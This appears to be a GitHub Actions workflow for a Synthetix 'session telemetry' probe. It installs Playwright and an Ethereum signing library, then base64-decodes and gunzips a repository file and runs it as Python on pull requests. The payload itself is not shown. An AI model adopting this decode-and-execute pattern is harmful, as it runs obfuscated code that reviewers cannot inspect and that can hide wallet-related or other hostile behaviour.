name: synthetix-session-telemetry-runtime

on:
  pull_request:
    paths:
      - .github/workflows/synthetix-session-telemetry-runtime.yml
      - audit_tools/synthetix_session_telemetry_runtime.py.gz.b64

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install isolated browser and signing dependencies
        shell: bash
        run: |
          set -euo pipefail
          python -m pip install --disable-pip-version-check 'playwright==1.55.0' 'eth-account==0.13.7'
          python -m playwright install --with-deps chromium

      - name: Decode and run intercepted production telemetry probe
        shell: bash
        run: |
          set -uo pipefail
          rm -rf session_telemetry_runtime
          mkdir -p session_telemetry_runtime
          base64 -d audit_tools/synthetix_session_telemetry_runtime.py.gz.b64 | gzip -d > /tmp/synthetix_session_telemetry_runtime.py
          set +e
          python -m py_compile /tmp/synthetix_session_telemetry_runtime.py > session_telemetry_runtime/run.log 2>&1
          status=$?
          if [ "$status" -eq 0 ]; then
            python /tmp/synthetix_session_telemetry_runtime.py >> session_telemetry_runtime/run.log 2>&1
            status=$?
          fi
          set -e
          cat session_telemetry_runtime/run.log
          exit "$status"

      - name: Upload redacted synthetic runtime evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: synthetix-session-telemetry-runtime
          path: session_telemetry_runtime/
          if-no-files-found: error
          retention-days: 1
